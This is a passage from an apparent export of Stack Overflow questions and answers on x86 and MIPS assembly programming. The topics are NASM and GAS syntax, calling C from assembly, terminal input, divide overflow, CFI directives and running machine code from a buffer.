","<p>Since you're loading 32-bit values from memory, you should declare <code>array</code> and <code>wordvar</code> using <code>dd</code> rather than <code>db</code>/<code>dw</code> so that each entry gets four bytes:</p>

<pre><code>array   dd 89, 10, 67, 1, 4, 27, 12, 34, 86, 3
wordvar dd 123     
</code></pre>

<p>Also, the indexing in the following is wrong:</p>

<pre><code>mov ebx, [array+1]
</code></pre>

<p>You probably meant:</p>

<pre><code>mov ebx, [array+1*4]
</code></pre>
","7675882"
"Use label in assembly from C","7251","","<p>I simply need a way to load the address of a label e.g. MyLabel: in e.g. 'src.asm' into a variable in e.g. 'src.c'. (These files will be linked together) I am using gcc and nasm to assemble these files. How can I load the label address?</p>
","<p>There are two steps to this. First, you must export the label as global from the assembly file using the <code>global</code> directive.</p>

<pre><code>global MyLabel

MyLabel: dd 1234    ; data or code, in whatever section.  It doesn't matter.
</code></pre>

<p>Next, you must declare the label as external in C. You can do this either in the code using it, or in a header.</p>

<pre><code>// It doesn't matter, and can be plain void,
// but prefer giving it a C type that matches what you put there with asm
extern void MyLabel(void);            // The label is code, even if not actually a function
extern const uint32_t MyLabel[];      // The label is data
// *not*  extern long *MyLabel, unless the memory at MyLabel *holds* a pointer.
</code></pre>

<hr>

<p>Finally, you get the address of the label in C the same way you get the address of any variable.</p>

<pre><code>doSomethingWith( &amp;MyLabel );
</code></pre>

<p>Note that some compilers add an underscore to the beginning of C variable and function names. For example, GCC does this on Mac OS X, but not Linux. I don't know about other platforms/compilers. To be on the safe side, you can add an <code>asm</code> statement to the variable declaration to tell GCC what the assembly name for the variable is.</p>

<pre><code>extern uint8_t MyLabel asm(""MyLabel"");
</code></pre>
","8045194"
"MOV src dest (or) MOV dest src?","7248","","<p>MOV is probably the first instruction everyone learns while learning ASM.</p>

<p>Just now I encountered a book <a href=""http://books.google.co.in/books?id=C3_WIQOYE2EC&amp;lpg=PP1&amp;dq=Assembly%20Language%20Programming%20in%20GNU%2FLinux%20for%20IA32%20Architectures&amp;pg=PA26#v=onepage&amp;q=&amp;f=false"" rel=""noreferrer"">Assembly Language Programming in GNU/Linux for IA32 Architectures By Rajat Moona</a> which says:</p>

<p><a href=""http://i.imagehost.org/0897/mov.gif"" rel=""noreferrer"">alt text http://i.imagehost.org/0897/mov.gif</a></p>

<p>But I learnt that it is <code>MOV dest, src</code>. Its like ""Load <code>dest</code> with <code>src</code>"". Even <a href=""http://en.wikipedia.org/wiki/MOV_(x86_instruction)"" rel=""noreferrer"">Wiki</a> says the same.</p>

<p>I'm not saying that the author is wrong. I know that he is right. But what am I missing here?</p>

<p>btw.. he is using GCC's <code>as</code> to assemble these instructions. But that shouldn't change the instruction syntax right?</p>
","<p><code>mov dest, src</code> is called <strong>Intel syntax</strong>.</p>

<p><code>mov src, dest</code> is called <strong>AT&amp;T syntax</strong>.</p>

<p>The GNU assembler uses AT&amp;T syntax, all other x86 assemblers I know of uses Intel syntax. You can read up on the differences <a href=""http://en.wikipedia.org/wiki/X86_assembly_language#Syntax"">on wikipedia</a>.</p>
","2397543"
"NASM is pure assembly, but MASM is high level Assembly?","7224","","<p>I'm learning assembly, motivation being able to <strong>reverse engineer</strong>. I'm trying to find the assembler I should begin with, so that I can then find tutorials and start writing some assembly.</p>

<p>I came to know that MASM has a lot of built in constructs, so I'll be using them mostly instead of coding them which I'll have to do if I choose NASM.</p>

<p>My question is.. is that true? If it is, <strong>what assembler you suggest for learning assembly from a reverse engineer's perspective</strong> and some good tutorials for it.</p>

<p>Also, if you have other suggestions regarding reversing? Alternative approach or something?</p>

<p>P.S: I have read many articles and questions here, but am still confused.</p>
","<p>My recommendation purely from a ""reverse engineering"" perspective is to understand how a compiler translates high-level concepts into assembly language instructions in the first place.  The understanding of how register allocation is done in various compilers and how various optimizations will obscure the high-level representation of nested loops (et.al.) is more important than being able to write one particular dialect of assembly input.</p>

<p>Your best bet is to start with the assembly language intermediate files from source code that you write (see <a href=""https://stackoverflow.com/questions/840321/how-can-i-see-the-assembly-code-for-a-c-program"">this question for more information</a>).  Then you can change the source and see how it affects the intermediate files.  The other place to start is by using an <em>interactive disassembler</em> like <a href=""http://www.hex-rays.com/"" rel=""nofollow noreferrer"">IDA Pro</a>.</p>

<p>Actually writing assembly language programs and learning the syntax of NASM, MASM, <code>gas</code>, of <code>as</code> is the easiest part and it does not really matter which one you learn.  They are very similar because the syntax of the source language is very basic.  If you are planning to learn how to disassemble and understand what a program is doing, then I would completely ignore macro assemblers since the macros completely disappear during translation and you will not see them when looking at disassembler output.</p>

<p><strong>Diatribe on Learning Assembly</strong></p>

<p>Learning an assembly language is different than learning a higher level programming language.  There are fewer syntactical constructs if you ignore macro assemblers.  The problem is that every compiler chain has a slightly different representation so you have to concentrate on the concepts such as supported address modes, register restrictions, etc.  These aren't part of the language per se as they are dictated by the hardware.</p>

<p>The approach that I took (partially because the university forced me to), is to explore and understand the hardware itself (e.g., # of registers, size of registers, type of branch instructions supported, etc.) and slightly more academic concepts such as interrupts and using bitwise manipulation for integer match before you start to write assembly language programs.  This is a much longer route but results in a rich understanding of assembly and how to write high performance programs.</p>

<p>The interesting thing is that in the time that I spent learning assembly and compiler construction (which is intrinsically related), I actually wrote very few assembly programs.  More often, I am required to write little snippets of inline assembly here and there (e.g. setting up index registers when the runtime loader didn't).  I have spent an enormous amount of time dissecting crash dumps from a memory location, loader map file, and assembler output listings.  I can honestly say that the syntax of each assembler is dramatically different as well as what various compilers will do to muddle the intent into fast or small code.  </p>

<p>Learning how to write assembly programs was the least worthwhile part of the education process.  It was necessary to understand how source is translated into the bits and bytes that the computer executes, but it really was not what I really needed to reverse engineer from a raw binary (disassembler -> assembly listing -> best guess of high level intent) or a memory dump.  I do more of the latter, but the requirements of the job are the same.</p>

<ol>
<li>You really have to understand what the constraints of the architecture are.</li>
<li>You have to know the very basic syntax of the assembler in question - how are address modes indicated, how are registers indicated, what is the order of arguments for a <code>move</code></li>
<li>What transformations a compiler does to go from <code>if (a &gt; 0)</code> to <code>mov.b r0,d0 ... bnz $L</code></li>
</ol>

<p>Start by learning about computer architecture (e.g., read something from <a href=""http://en.wikipedia.org/wiki/Andrew_S._Tanenbaum"" rel=""nofollow noreferrer"">Andrew Tanenbaum</a>), then how an OS actually loads and runs a program (Levine's <a href=""http://www.iecc.com/linker/"" rel=""nofollow noreferrer""><em>Linkers &amp; Loaders</em></a>), then compile simple programs in C/C++ and look at the assembly language listings.</p>
","9944294"
"Recursive Fibonacci Assembly MIPS code","7218","","<p>I have created a code generator for my coursework in a module compilers. It generates code in MIPS assembly code and seems to be working ok (ive tested very simple programs and expressions). 
I tested the recursive Fibonacci program and it currently loops forever. The base cases, 0 and 1, work ok. But when I try fib(2) or more it keeps looping.
Not sure what the problem is, can anyone help me find it?</p>

<p>Here is the code:</p>

<pre><code>main: 
move $fp $sp 
sw $ra 0($sp)
addiu $sp $sp -4 
sw $fp 0($sp) 
addiu $sp $sp -4 
li $a0 2 #testing comment
sw $a0 0($sp) 
addiu $sp $sp -4 
jal fib_entry 
lw $ra 4($sp) 
addiu $sp $sp 8 
lw $fp 0($sp) 
li $v0, 10 
syscall 
fib_entry: 
move $fp $sp 
sw $ra 0($sp)
addiu $sp $sp -4 
lw $a0 4($fp) 
sw $a0 0($sp) 
addiu $sp $sp -4 
li $a0 0 
lw $t1 4($sp) 
addiu $sp $sp 4 
beq $a0 $t1 thenBranch1
elseBranch1: 
lw $a0 4($fp) 
sw $a0 0($sp) 
addiu $sp $sp -4 
li $a0 1 
lw $t1 4($sp) 
addiu $sp $sp 4 
beq $a0 $t1 thenBranch2
elseBranch2: 
sw $fp 0($sp) 
addiu $sp $sp -4 
lw $a0 4($fp) 
sw $a0 0($sp) 
addiu $sp $sp -4 
li $a0 1 
lw $t1 4($sp) 
sub $a0 $t1 $a0 
addiu $sp $sp 4 
sw $a0 0($sp) 
addiu $sp $sp -4 
jal fib_entry 
sw $a0 0($sp) 
addiu $sp $sp -4 
sw $fp 0($sp) 
addiu $sp $sp -4 
lw $a0 4($fp) 
sw $a0 0($sp) 
addiu $sp $sp -4 
li $a0 2 
lw $t1 4($sp) 
sub $a0 $t1 $a0 
addiu $sp $sp 4 
sw $a0 0($sp) 
addiu $sp $sp -4 
jal fib_entry 
lw $t1 4($sp) 
add $a0 $a0 $t1 
addiu $sp $sp 4 
b endIf2 
thenBranch2: 
li $a0 1 
endIf2: 
b endIf1 
thenBranch1: 
li $a0 0 
endIf1: 
lw $ra 4($sp) 
addiu $sp $sp 12 
lw $fp 0($sp) 
jr $ra 
</code></pre>
","<p>Various problems with that code.</p>

<ol>
<li>you should be decrementing <code>$sp</code> <strong>before</strong> you write to <code>($sp)</code> (although this is only by convention)</li>
<li>you should be saving <code>$fp</code> <strong>before</strong> you modify it (this is by common sense ;))</li>
<li>MIPS typically uses registers to pass arguments (but you can of
course make up your own convention)</li>
<li>your stack handling is horribly overcomplicated, and at least in <code>main</code> it's unbalanced</li>
<li>it's recommended to return from <code>main</code> and not use <code>exit</code> syscall</li>
</ol>

<p>You should of course be able to write and debug asm code before you try to generate some.</p>

<p>Given an input structured something like this C implementation:</p>

<pre><code>unsigned fib_entry(unsigned n) {
    unsigned ret;
    unsigned n1;
    unsigned f1;
    unsigned n2;
    unsigned f2;

    if (n &lt;= 1) goto fib_small;

    n1 = n - 1;
    f1 = fib_entry(n1);
    n2 = n - 2;
    f2 = fib_entry(n2);
    ret = f1 + f2;
    goto fib_done;

fib_small:
    ret = n;

fib_done:
    return ret;
}
</code></pre>

<p>I would expect a not-too-clever compiler to produce code like this:</p>

<pre><code>fib_entry:
    addiu $sp $sp -28   # we need room for $ra, n, ret, n1, n2, f1, f2
    sw $ra, 24($sp)     # store $ra since not leaf function
    sw $a0, 20($sp)     # store n

    lw $t0, 20($sp)     # load n
    ble $t0 1 fib_small

    lw $t0, 20($sp)     # load n
    addi $t0 $t0 -1     # n - 1
    sw $t0, 12($sp)     # store as n1

    lw $a0, 12($sp)     # pass n1 as argument
    jal fib_entry
    sw $v0 4($sp)       # store into f1

    lw $t0, 20($sp)     # load n
    addi $t0 $t0 -2     # n - 2
    sw $t0, 8($sp)      # store as n2

    lw $a0, 8($sp)      # pass n2 as argument
    jal fib_entry
    sw $v0 ($sp)        # store into f2

    lw $t0 4($sp)       # f1
    lw $t1 ($sp)        # f2
    addu $t0 $t0 $t1    # f1 + f2
    sw $t0 16($sp)      # store into ret

    b fib_done

fib_small:
    lw $t0, 20($sp)     # load n
    sw $t0 16($sp)      # store into ret

fib_done:
    lw $v0 16($sp)      # load return value
    lw $ra 24($sp)      # restore $ra
    addiu $sp $sp 28    # restore stack
    jr $ra              # return
</code></pre>

<p>Note I have deliberately left it unoptimized. This kind of code should be simple enough to generate.</p>
","13459948"
"How do i read single character input from keyboard using nasm (assembly) under ubuntu?","7208","","<p>I'm using nasm under ubuntu. By the way i need to get single input character from user's keyboard (like when a program ask you for y/n ?) so as key pressed and without pressing enter i need to read the entered character. I googled it a lot but all what i found was somehow related to this line (<code>int 21h</code>) which result in ""Segmentation Fault"". Please help me to figure it out how to get single character or how to over come this segmentation fault.</p>
","<p>It can be done from assembly, but it isn't easy.  You can't use int 21h, that's a DOS system call and it isn't available under Linux.</p>

<p>To get characters from the terminal under UNIX-like operating systems (such as Linux), you read from STDIN (file number 0).  Normally, the read system call will block until the user presses enter.  This is called canonical mode.  To read a single character without waiting for the user to press enter, you must first disable canonical mode.  Of course, you'll have to re-enable it if you want line input later on, and before your program exits.</p>

<p>To disable canonical mode on Linux, you send an IOCTL (IO ControL) to STDIN, using the ioctl syscall.  I assume you know how to make Linux system calls from assembler.</p>

<p>The ioctl syscall has three parameters.  The first is the file to send the command to (STDIN), the second is the IOCTL number, and the third is typically a pointer to a data structure.  ioctl returns 0 on success, or a negative error code on fail.</p>

<p>The first IOCTL you need is TCGETS (number 0x5401) which gets the current terminal parameters in a termios structure.  The third parameter is a pointer to a termios structure.  From the kernel source, the termios structure is defined as:</p>

<pre><code>struct termios {
    tcflag_t c_iflag;               /* input mode flags */
    tcflag_t c_oflag;               /* output mode flags */
    tcflag_t c_cflag;               /* control mode flags */
    tcflag_t c_lflag;               /* local mode flags */
    cc_t c_line;                    /* line discipline */
    cc_t c_cc[NCCS];                /* control characters */
};
</code></pre>

<p>where tcflag_t is 32 bits long, cc_t is one byte long, and NCCS is currently defined as 19.  See the NASM manual for how you can conveniently define and reserve space for structures like this.</p>

<p>So once you've got the current termios, you need to clear the canonical flag.  This flag is in the c_lflag field, with mask ICANON (0x00000002).  To clear it, compute c_lflag AND (NOT ICANON). and store the result back into the c_lflag field.</p>

<p>Now you need to notify the kernel of your changes to the termios structure.  Use the TCSETS (number 0x5402) ioctl, with the third parameter set the the address of your termios structure.</p>

<p>If all goes well, the terminal is now in non-canonical mode.  You can restore canonical mode by setting the canonical flag (by ORing c_lflag with ICANON) and calling the TCSETS ioctl again. <strong>always restore canonical mode before you exit</strong></p>

<p>As I said, it isn't easy.</p>
","3380413"
"What is the ""relationship"" between addi and subi?","7206","","<p>I'm supposed to answer this question. After some research it says that add and sub have the same opcode and differ only in the functional field. Is this the answer or something else?</p>

<h2>Update</h2>

<p>It's available in the Nios II CPU manual:</p>

<pre><code>subi
subtract immediate
Operation: rB ← rA – σ (IMMED)
Assembler Syntax: subi rB, rA, IMMED
Example: subi r8, r8, 4
Description: Sign-extends the immediate value IMMED to 32 bits, subtracts it from the value of rA and then
            stores the result in rB.
Usage: The maximum allowed value of IMMED is 32768. The minimum allowed value is
–32767.
Pseudo-instruction:
© March 2009
subi is implemented as addi rB, rA, -IMMED
</code></pre>
","<p>I'm unaware that MIPS even <em>has</em> a proper <code>subi</code> instruction (though some environments may implement a macro for it).</p>

<p>Since you're subtracting an <em>immediate</em> value, you can just provide the negation of it to the <code>addi</code> instruction:</p>

<pre><code>addi $r1, $r2, -42     ; equivalent to subi $r1, $r2, 42
</code></pre>

<p>The immediate operand is a two's complement value which means it's perfectly capable of being a negative number and the way that two's complement works means that you can add a negative number in an <em>unsigned</em> manner and that gives the same result as subtracting (since you wrap around).</p>

<p>For example, <code>-42</code> in 16-bit two's complement is the unsigned value <code>65494</code>. When you add <code>50</code> and <code>65494</code> wrapping around at 65536, you end up with:</p>

<pre><code>     50
+ 65494 (ie, -42)
  -----
  65544 (overflow, so
- 65536  we wrap at 64K)
  -----
      8 (identical to ""50 - 42"")
</code></pre>
","11981757"
"Assembly: Invalid effective address","7198","","<p>I'm new to assembly (as you can plainly see) and I'm trying to compile the following:</p>

<pre><code>hex_charmap db '0123456789ABCDE'
mov   al, [hex_charmap + ax]
</code></pre>

<p>However I get the following error on line 2:</p>

<blockquote>
  <p>error: invalid effective address</p>
</blockquote>

<p>What does this mean and how can I fix it?</p>
","<p>My assembler's rusty. Can AX really be used as an indexing register? </p>

<p><strong>Update</strong>:</p>

<p>Just found what I was looking for. <strong>Only BX can be used as an index register!</strong></p>

<p>See this link for another similar questions and its similar explanation:</p>

<p><a href=""https://stackoverflow.com/questions/2809141/invalid-effective-address-calculation"">invalid effective address calculation</a></p>
","1797782"
"Importance of Hexadecimal numbers in Computer Science","7192","","<p>When studying programming 8085, 8086 and microporcessors in general we always have hexadecimal representation. Its ok that binary numbers are important in computers. But how these hexadecimal numbers are important? Any historical importance?</p>

<p>It would be nice if someone point to some historical papers also.</p>

<p><strong>EDIT:</strong></p>

<p>How computers handle hexadecimal numbers? For example what happens in 8085 when a hexadecimal number is given as input?</p>
","<p>Hexadecimal has a closer visual mapping to the various bytes used to store a number than decimal does.</p>

<p>For example, you can tell from the hexadecimal number <code>0x12345678</code> that the most significant byte will hold <code>0x12</code> and the least significant byte will hold <code>0x78</code>. The decimal equivalent of that, <code>305419896</code>, tells you nothing.</p>

<p>From a historical perspective, it's worth mentioning that octal was more commonly used when working with certain older computers that employed a different number of bits per word than modern 16/32-bit computers. From the <a href=""http://en.wikipedia.org/wiki/Octal"" rel=""noreferrer"">Wikipedia article on octal</a>:</p>

<blockquote>
  <p>Octal became widely used in computing when systems such as the PDP-8, ICL 1900 and IBM mainframes employed 12-bit, 24-bit or 36-bit words. Octal was an ideal abbreviation of binary for these machines because their word size is divisible by three</p>
</blockquote>

<p>As for how computers handle hexadecimal numbers, by the time the computer is dealing with it, the original base used to input the number is completely irrelevant. The computer is just dealing with bits and bytes.</p>
","16514852"
"Call C function from Assembly -- the application freezes at ""call printf"" and I have no idea why","7183","","<p>I will be working on a big Assembly project but am now just starting to learn this new language. I am trying to make some simple examples like you might find for c++ in highschool (sum two numbers, is a number prime, etc).</p>

<p>Now I've got to display all prime numbers up to n. The problem is that the application freezes at ""call printf"" and I have no idea why.</p>

<p>Can you help me with this?</p>

<pre><code>.section    .data
prime_number_str:
.asciz  ""%d ""

.section    .text

.global     _start
_start:
pushl   $20
call .first_prime_numbers
addl $4, %esp
pushl $0
call exit


.first_prime_numbers:       #argument first n numbers
movl 4(%esp), %ecx  #get the first argument
do_test:
pushl %ecx      #push function arguments
call .prime 
addl $4, %esp       #restore the stack

#if not prime jump to the next number   
cmpl $0, %eax
je no_not_prime

#print the number
pushl %eax          #save eax
pushl %ecx          #first argument
pushl $prime_number_str     #text to print
call printf
addl $4, %esp
popl %eax           #restore eax

no_not_prime:
loop do_test
ret


.prime:             #argument: number to check
movl 4(%esp), %eax  #get the first argument

#divide the argument by 2   
xorl %edx, %edx             
movl $2, %ecx           
pushl %eax      #save the value of eax
divl %ecx       
movl %eax, %ecx     #init the counter register
popl %eax       #restore the value of eax

movl $1, %ebx       #assume the argument is prime
test_prime:
# if ecx == 1 then return exit the function
cmpl $1, %ecx       
jle return_value

pushl %eax      #save the old value of eax  

#divide the value by the value of counter   
xorl %edx, %edx     
divl %ecx       

#if the reminder is 0 then the number is not prime
cmpl $0, %edx   
popl %eax       #restore the value of eax   
je not_prime


subl $1, %ecx       #decrease counter
jmp test_prime      #try next division

not_prime:
movl $0, %ebx
return_value:
movl %ebx, %eax
ret 
</code></pre>
","<p>It is probably because your registers are all messed up after called <code>printf</code>, you need to save the registers that you tend to use after <code>printf</code> and then restore them after the call.</p>

<p>This is something you should do Always when you do <code>syscall</code> or other calls that might tampere with your registers.</p>

<p>Also you should look into <code>gdb</code> ( gnu debugger ) looks like you are coding GAS so if you are on a gnu / linux system try:</p>

<pre><code>gdb youprogram
</code></pre>

<p>and then run it to see where it fails.</p>
","1550765"
"What is .cfi and .LFE in assembly code produced by GCC from c++ program?","7168","","<p>I have the following c++ code</p>

<pre><code>int factorial(int n){

    if(n==0){
        return 1;
    }
    return n*factorial(n-1);

}

int main(void){
    factorial(5);
    return 0;
}
</code></pre>

<p>When I create an assembly file using g++ -S factorial.cpp I get the following:</p>

<pre><code>    .file   ""tail_call_opt.cpp""
    .text
.globl _Z9factoriali
    .type   _Z9factoriali, @function
_Z9factoriali:
.LFB0:
    .cfi_startproc
    .cfi_personality 0x0,__gxx_personality_v0
    pushl   %ebp
    .cfi_def_cfa_offset 8
    movl    %esp, %ebp
    .cfi_offset 5, -8
    .cfi_def_cfa_register 5
    subl    $24, %esp
    cmpl    $0, 8(%ebp)
    jne .L2
    movl    $1, %eax
    jmp .L3
.L2:
    movl    8(%ebp), %eax
    subl    $1, %eax
    movl    %eax, (%esp)
    call    _Z9factoriali
    imull   8(%ebp), %eax
.L3:
    leave
    ret
    .cfi_endproc
.LFE0:
    .size   _Z9factoriali, .-_Z9factoriali
.globl main
    .type   main, @function
main:
.LFB1:
    .cfi_startproc
    .cfi_personality 0x0,__gxx_personality_v0
    pushl   %ebp
    .cfi_def_cfa_offset 8
    movl    %esp, %ebp
    .cfi_offset 5, -8
    .cfi_def_cfa_register 5
    andl    $-16, %esp
    subl    $16, %esp
    movl    $5, (%esp)
    call    _Z9factoriali
    movl    $0, %eax
    leave
    ret
    .cfi_endproc
.LFE1:
    .size   main, .-main
    .ident  ""GCC: (Ubuntu 4.4.3-4ubuntu5) 4.4.3""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>I can follow most of this, but what is the purpose of the .cfi and the .LFE parts?
Where can I learn more about the assembly produced by gcc?</p>
","<p>These directives tell gas to emit Dwarf Call Frame Information tags which are apparently used to reconstruct a stack backtrace when a frame pointer is missing. In your case the frame pointer is present, so I guess it could be used to perform unwinding during exception handling. Such mechanism has less overhead than the old sjlj (setjump/longjump) one. See <a href=""http://www.logix.cz/michal/devel/gas-cfi/"" rel=""noreferrer"">here</a>, and also the linked Dwarf spec.</p>

<p>As for .Lxx labels, .L prefix indicates that the label is local to this file and so will not conflict with the same-name labels in other files. GCC generally uses .L for auto-generated labels. In this case most likely ""FB"" means ""function begin"" and ""FE"" means ""function end"".</p>
","3570447"
"How to get c code to execute hex bytecode?","7167","","<p>I want a simple C method to be able to run hex bytecode on a Linux 64 bit machine.  Here's the C program that I have:</p>

<pre><code>char code[] = ""\x48\x31\xc0"";
#include &lt;stdio.h&gt;
int main(int argc, char **argv)
{
        int (*func) ();
        func = (int (*)()) code;
        (int)(*func)();
        printf(""%s\n"",""DONE"");
}
</code></pre>

<p>The code that I am trying to run (<code>""\x48\x31\xc0""</code>) I obtained by writting this simple assembly program (it's not supposed to really do anything)</p>

<pre><code>.text
.globl _start
_start:
        xorq %rax, %rax
</code></pre>

<p>and then compiling and objdump-ing it to obtain the bytecode.</p>

<p>However, when I run my C program I get a segmentation fault.  Any ideas?</p>
","<p>Here is a simple example.</p>

<p>main.c:</p>

<pre><code>#include &lt;sys/mman.h&gt;
#include &lt;string.h&gt;

int main ()
{
  /*                                                              
        mov rax, 60          ; sys_exit
        mov rdi, 2
        syscall                                                   
  */
  char code[] = {
      0x48, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x48, 0xbf, 0x02, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x0f, 0x05
  };

  void *buf;

  /* copy code to executable buffer */    
  buf = mmap (0,sizeof(code),PROT_READ|PROT_WRITE|PROT_EXEC,
              MAP_PRIVATE|MAP_ANON,-1,0);
  memcpy (buf, code, sizeof(code));

  /* run code */
  ((void (*) (void))buf)();

  return 0;
}
</code></pre>

<p>Run this with</p>

<pre><code>./main ;echo $?
</code></pre>

<p>I chose to do an _exit(2) in the assembly to make it easy to check that the code is run properly. In practice you'll want to add a ret at the end of your code to return control.</p>
","9964472"
"Causing a divide overflow error (x86)","7166","","<p>I have a few questions about divide overflow errors on x86 or x86_64 architecture.  Lately I've been reading about integer overflows.  Usually, when an arithmetic operation results in an integer overflow, the carry bit or overflow bit in the FLAGS register is set.  But apparently, according to <a href=""http://www.codeguru.com/cpp/sample_chapter/article.php/c11111"" rel=""noreferrer"">this article</a>, overflows resulting from division operations don't set the overflow bit, but rather trigger a hardware exception, similar to when you divide by zero.  </p>

<p>Now, integer overflows resulting from division are a lot more rare than say, multiplication.  There's only a few ways to even trigger a division overflow.  One way would be to do something like:</p>

<pre><code>int16_t a = -32768;
int16_t b = -1;
int16_t c = a / b;
</code></pre>

<p>In this case, due to the two's complement representation of signed integers, you can't represent positive 32768 in a signed 16-bit integer, so the division operation overflows, resulting in the erroneous value of -32768.</p>

<p>A few questions:</p>

<p>1) Contrary to what this article says, the above did NOT cause a hardware exception.  I'm using an x86_64 machine running Linux, and when I divide by zero the program terminates with a <code>Floating point exception</code>.  But when I cause a division overflow, the program continues as usual, silently ignoring the erroneous quotient.  So why doesn't this cause a hardware exception?</p>

<p>2) Why are division errors treated so severely by the hardware, as opposed to other arithmetic overflows?  Why should a multiplication overflow (which is <em>much</em> more likely to accidentally occur) be silently ignored by the hardware, but a division overflow is supposed to trigger a fatal interrupt?</p>

<p>=========== <strong>EDIT</strong> ==============</p>

<p>Okay, thanks everyone for the responses.  I've gotten responses saying basically that the above 16-bit integer division shouldn't cause a hardware fault because the quotient is still less than the register size.  I don't understand this.  In this case, the register storing the quotient is 16-bit - which is <em>too small</em> to store signed positive 32768.  So why isn't a hardware exception raised?</p>

<p>Okay, let's do this directly in GCC inline assembly and see what happens:</p>

<pre><code>int16_t a = -32768;
int16_t b = -1;

__asm__
(
    ""xorw %%dx, %%dx;""            // Clear the DX register (upper-bits of dividend)
    ""movw %1, %%ax;""              // Load lower bits of dividend into AX
    ""movw %2, %%bx;""              // Load the divisor into BX
    ""idivw %%bx;""                 // Divide a / b (quotient is stored in AX)
    ""movw %%ax, %0;""              // Copy the quotient into 'b'
    : ""=rm""(b)                    // Output list
    :""ir""(a), ""rm""(b)             // Input list
    :""%ax"", ""%dx"", ""%bx""          // Clobbered registers
);

printf(""%d\n"", b);
</code></pre>

<p>This simply outputs an erroneous value: <code>-32768</code>.  Still no hardware exception, even though the register storing the quotient (AX) is too small to fit the quotient.  So I don't understand why no hardware fault is raised here.  </p>
","<p>In C language arithmetic operations are never performed within the types smaller than <code>int</code>. Any time you attempt arithmetic on smaller operands, they are first subjected to integral promotions which convert them to <code>int</code>. If on your platform <code>int</code> is, say, 32-bit wide, then there's no way to force a C program to perform 16-bit division. The compiler will generate 32-bit division instead. This is probably why your C experiment does not produce the expected overflow on division. If your platform does indeed have 32-bit <code>int</code>, then your best bet would be to try the same thing with 32-bit operands (i.e. divide <code>INT_MIN</code> by <code>-1</code>). I'm pretty sure that way you'll be able to eventually reproduce the overflow exception even in C code.</p>

<hr>

<p>In your assembly code you are using 16-bit division, since you specified <code>BX</code> as the operand for <code>idiv</code>. 16-bit division on x86 divides the 32-bit dividend stored in <code>DX:AX</code> pair by the <code>idiv</code> operand. This is what you are doing in your code. The <code>DX:AX</code> pair is interpreted as one composite 32-bit register, meaning that the sign bit in this pair is now actually the highest-order bit of <code>DX</code>. The highest-order bit of <code>AX</code> is not a sign bit anymore.</p>

<p>And what you did you do with <code>DX</code>? You simply cleared it. You set it to 0. But with <code>DX</code> set to 0, your dividend is interpreted as <em>positive</em>! From the machine point of view, such a <code>DX:AX</code> pair actually represents a <em>positive</em> value <code>+32768</code>. I.e. in your assembly-language experiment you are dividing <code>+32768</code> by <code>-1</code>. And the result is <code>-32768</code>, as it should be. Nothing unusual here.</p>

<p>If you want to represent <code>-32768</code> in the <code>DX:AX</code> pair, you have to sign-extend it, i.e. you have to fill <code>DX</code> with all-one bit pattern, instead of zeros. Instead of doing <code>xor DX, DX</code> you should have initialized <code>AX</code> with your <code>-32768</code> and then done <code>cwd</code>. That would have sign-extended <code>AX</code> into <code>DX</code>.</p>

<p>For example, in my experiment (not GCC) this code </p>

<pre><code>__asm  {
  mov AX, -32768
  cwd
  mov BX, -1
  idiv BX
}
</code></pre>

<p>causes the expected exception, because it does indeed attempt to divide <code>-32768</code> by <code>-1</code>.</p>
","3892620"
"How to use address constants in GCC x86 inline assembly","7162","","<p>The GCC toolchain uses AT&amp;T assembler syntax by default, but support for Intel syntax is available via the <code>.intel_syntax</code> directive.</p>

<p>Additionally, both AT&amp;T and Intel syntax are available in a <code>prefix</code> and a <code>noprefix</code> version, which differ in whether or not they require to prefix register names with a <code>%</code> sigil.</p>

<p>Depending on which directives are present, the format for address constants changes.</p>

<p>Let's consider the following C code</p>

<pre><code>*(int *)0xdeadbeef = 0x1234;
</code></pre>

<p>Using <code>objdump -d</code>, we find that it's compiled to the following assembler instruction</p>

<pre><code>movl $0x1234,0xdeadbeef
</code></pre>

<p>As there are no registers involved, this is the correct syntax for both <code>.att_syntax prefix</code> and <code>.att_syntax noprefix</code>, ie. embedded in C code, they look like this</p>

<pre><code>__asm__("".att_syntax prefix"");
__asm__(""movl $0x1234,0xdeadbeef"");

__asm__("".att_syntax noprefix"");
__asm__(""movl $0x1234,0xdeadbeef"");
</code></pre>

<p>You can optionally surround the address constant with parentheses, ie.</p>

<pre><code>__asm__(""movl $0x1234,(0xdeadbeef)"");
</code></pre>

<p>will work as well.</p>

<p>When adding a sigil to a plain address constant, the code will fail to copile</p>

<pre><code>__asm__(""movl $0x1234,$0xdeadbeef""); // won't compile
</code></pre>

<p>When surrounding this expression with paranthesis, the compiler will emit wrong code without warning, ie</p>

<pre><code>__asm__(""movl $0x1234,($0xdeadbeef)""); // doesn't warn, but doesn't work!
</code></pre>

<p>This will incorrectly emit the instruction</p>

<pre><code>movl $0x1234,0x0
</code></pre>

<p>In Intel mode, an address constant has to be prefixed with a segment register as well as the operand size and the <code>PTR</code> flag if ambiguity is possible. On my machine (an Intel dual core laptop with Windows XP and current MinGW and Cygwin GCC versions), the register <code>ds</code> is used by default.</p>

<p>Square brackets around the constant are optional. The address constant is also correctly recognized if the segment register is omitted, but the brackets are present. Omitting the register emits a warning on my system, though.</p>

<p>In <code>prefix</code> mode, the segment register has to be prefixed with <code>%</code>, but only using brackets will still work. These are the different ways to generate the correct instruction:</p>

<pre><code>__asm__("".intel_syntax noprefix"");
__asm__(""mov DWORD PTR ds:0xdeadbeef,0x1234"");
__asm__(""mov DWORD PTR ds:[0xdeadbeef],0x1234"");
__asm__(""mov DWORD PTR [0xdeadbeef],0x1234""); // works, but warns!

__asm__("".intel_syntax prefix"");
__asm__(""mov DWORD PTR %ds:0xdeadbeef,0x1234"");
__asm__(""mov DWORD PTR %ds:[0xdeadbeef],0x1234"");
__asm__(""mov DWORD PTR [0xdeadbeef],0x1234""); // works, but warns!
</code></pre>

<p>Omitting both segment register and brackets will fail to compile</p>

<pre><code>__asm__(""mov DWORD PTR 0xdeadbeef,0x1234""); // won't compile
</code></pre>

<p>I'll mark this question as <em>community wiki</em>, so if you have anything useful to add, feel free to do so.</p>
","<p>The <code>noprefix</code>/<code>prefix</code> directives only control whether registers require a <code>%</code> prefix(*) (at least it seems so and that's the only difference the documentation mentions).  Value literals always need a <code>$</code> prefix in AT&amp;T syntax and never in Intel syntax.  So the following works:</p>

<pre><code>__asm__("".intel_syntax prefix"");
